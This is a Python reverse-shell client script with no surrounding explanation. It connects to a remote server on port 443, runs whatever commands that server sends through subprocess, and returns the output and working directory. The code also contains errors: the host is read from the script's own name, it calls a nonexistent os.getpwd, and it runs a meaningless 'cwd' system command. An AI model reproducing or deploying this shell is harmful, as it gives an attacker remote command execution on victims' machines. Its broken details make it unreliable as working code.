import socket
import os
import subprocess
import sys

Host = sys.argv[0]
Port = 443
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create the socket object
s = socket.socket()
# connect to the server
s.connect((Host, Port))

cwd = 'cwd'
os.system(cwd)

s.send(cwd.encode())

while True:



    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        # execute the command and retrieve the results
        output = subprocess.getoutput(command)
    # get the current working directory as output
    pwd = os.getpwd()
    # send the results back to the server
    message = f"{output}{SEPARATOR}{pwd}"
    s.send(message.encode())
    
# close client connection
s.close()
